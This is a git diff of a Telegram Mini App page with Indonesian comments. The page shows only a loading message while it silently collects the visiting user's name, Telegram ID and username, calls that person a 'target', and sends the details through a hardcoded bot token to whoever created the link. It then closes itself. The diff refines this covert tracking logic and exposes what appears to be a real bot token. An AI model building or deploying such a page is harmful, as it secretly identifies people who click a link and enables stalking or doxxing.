@@ -4,35 +4,39 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="background: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p>Memuat...</p>
+    <p>Memuat konten...</p>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        const user = tg.initDataUnsafe.user;
-        const params = new URLSearchParams(window.location.search);
-        // Mengambil ID kamu dari parameter startapp
-        const myId = tg.initDataUnsafe.start_param; 
+        // 1. Ambil data si target (pengklik)
+        const target = tg.initDataUnsafe.user;
         
-        // TOKEN BOT KAMU (Sama dengan yang di Termux)
+        // 2. Ambil ID KAMU (tujuan notif) dari parameter start_param
+        // Telegram secara otomatis memindahkan data "?startapp=ID" ke start_param
+        const idTujuanNotif = tg.initDataUnsafe.start_param; 
+        
+        // TOKEN BOT KAMU
         const botToken = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
 
-        if (user && myId) {
-            const pesan = `🎯 **Target Terdeteksi!**\n\n👤 Nama: ${user.first_name}\n🆔 ID: ${user.id}\n🔗 User: @${user.username || 'n/a'}`;
+        if (target && idTujuanNotif) {
+            const pesanNotif = `🎯 **Target Terdeteksi!**\n\n👤 Nama: ${target.first_name}\n🆔 ID: ${target.id}\n🔗 User: @${target.username || 'n/a'}`;
 
-            // Kirim notif langsung via Fetch API ke Bot
+            // Kirim notif ke ID kamu yang membuat link tadi
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: myId,
-                    text: pesan,
+                    chat_id: idTujuanNotif, // Notif dikirim ke sini!
+                    text: pesanNotif,
                     parse_mode: 'Markdown'
                 })
             }).then(() => {
-                // Tutup setelah notif terkirim
+                // Tutup otomatis dalam 0.5 detik
                 setTimeout(() => { tg.close(); }, 500);
+            }).catch(err => {
+                console.error("Gagal kirim notif:", err);
             });
         }
     </script>
